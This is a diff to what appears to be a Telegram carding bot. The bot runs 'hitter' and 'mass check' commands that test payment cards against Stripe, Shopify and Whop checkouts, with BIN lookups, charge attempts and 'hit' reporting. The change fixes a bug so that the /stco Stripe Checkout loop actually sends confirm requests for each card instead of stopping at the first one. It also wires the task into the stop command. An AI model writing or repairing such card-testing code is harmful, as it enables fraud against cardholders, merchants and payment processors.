@@ -70508,7 +69801,7 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                         gateway=gateway_from_response,
                         response=clean_response,
                         price=price_str,
-                        bin_info=(bin_text, bank, country, "USD", "US"),
+                        bin_info=bin_info,
                         user_id=u_id,
                         user_tier=tier,
                     )
@@ -76333,6 +75626,13 @@ _US_STATES = [
 # Active tasks for Whop Hitter
 whop_active_tasks = {}
 
+# Active tasks for /stco (Stripe Checkout Hitter).
+# /stco used to gate its card loop on `whop_active_tasks`, which only /whop
+# ever populates — so every /stco run broke out on the FIRST card and
+# reported "0/N checked, no hit" in a few hundred ms without sending a
+# single /confirm to Stripe.
+stco_active_tasks = {}
+
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  PREMIUM EMOJI WRAPPER (falls back to plain emoji)
@@ -79852,6 +79152,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Auto Stripe": auto_stripe_active_tasks,
         "ST1 $1 Charge": st1_charge_active_tasks,
         "MSH Shopify": msh_active_tasks if 'msh_active_tasks' in globals() else {},
+        "STCO": stco_active_tasks if 'stco_active_tasks' in globals() else {},
     }
     
     # Stop each active task
@@ -89346,7 +88647,6 @@ def main():
     
     # ============ STRIPE CO COMMANDS ============
     app.add_handler(CommandHandler("stco", stco_command))
-    app.add_handler(CommandHandler("stcodiag", stcodiag_command))
     
     # ============ JIO COMMANDS ============
     app.add_handler(CommandHandler("jhit", jhit_command))
